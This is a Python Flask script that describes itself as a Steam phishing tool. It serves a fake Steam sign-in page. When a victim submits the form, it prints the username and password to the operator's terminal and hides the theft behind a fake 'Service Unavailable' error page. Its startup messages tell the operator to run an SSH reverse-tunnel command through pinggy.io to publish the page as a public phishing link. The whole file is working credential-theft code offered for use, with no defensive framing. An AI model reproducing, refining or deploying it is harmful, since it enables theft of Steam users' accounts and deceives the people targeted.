from flask import Flask, request, render_template_string
import os
import sys
import time

# ON NE CHARGE PLUS PYNGROK ICI -> PLUS DE DEMANDE DE TOKEN
app = Flask(__name__)

def print_banner():
    # Petit effet de style pour ton projet
    os.system('clear')
    banner = "ST34M PH1SH1NG TO0L - CONNECTÉ VIA PINGGY"
    print("\033[95m" + "="*50)
    print(banner.center(50))
    print("="*50 + "\033[0m")

HTML_PAGE = '''
<!DOCTYPE html>
<html style="background-color: #1b2838; color: #c7d5e0; font-family: Arial;">
<head><title>Sign In</title></head>
<body>
    <div style="width: 350px; margin: 80px auto; background: #171a21; padding: 40px; border: 1px solid #101218;">
        <h2 style="color: #66c0f4; letter-spacing: 2px;">SIGN IN</h2>
        <form method="POST">
            <p style="font-size: 12px; color: #1999ff;">Steam Account Name</p>
            <input type="text" name="username" style="width:100%; background:#32353c; color:white; border:none; padding:10px; margin-bottom:15px;">
            <p style="font-size: 12px; color: #1999ff;">Password</p>
            <input type="password" name="password" style="width:100%; background:#32353c; color:white; border:none; padding:10px;">
            <br><br>
            <button type="submit" style="width:100%; padding:12px; background:linear-gradient(to right, #47bfff, #1a44c2); color:white; border:none; font-weight:bold; cursor:pointer;">Sign In</button>
        </form>
    </div>
</body>
</html>
'''

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        user = request.form.get('username')
        pw = request.form.get('password')
        print(f"\n\033[92m[+]\033[0m LOGIN REÇU : \033[93m{user}\033[0m | PASS : \033[93m{pw}\033[0m")
        return "<h1>Error 500</h1><p>Steam Service Unavailable.</p>"
    return render_template_string(HTML_PAGE)

if __name__ == '__main__':
    print_banner()
    print("\033[94m[ETAPE 1]\033[0m Serveur local lancé sur : http://127.0.0.1:5000")
    print("\033[94m[ETAPE 2]\033[0m Pour générer ton lien public, ouvre un NOUVEAU terminal et tape :")
    print("\033[92m          ssh -R 80:localhost:5000 a.pinggy.io\033[0m")
    print("-" * 50)
    
    # On force le lancement sans ngrok
    app.run(port=5000, debug=False)
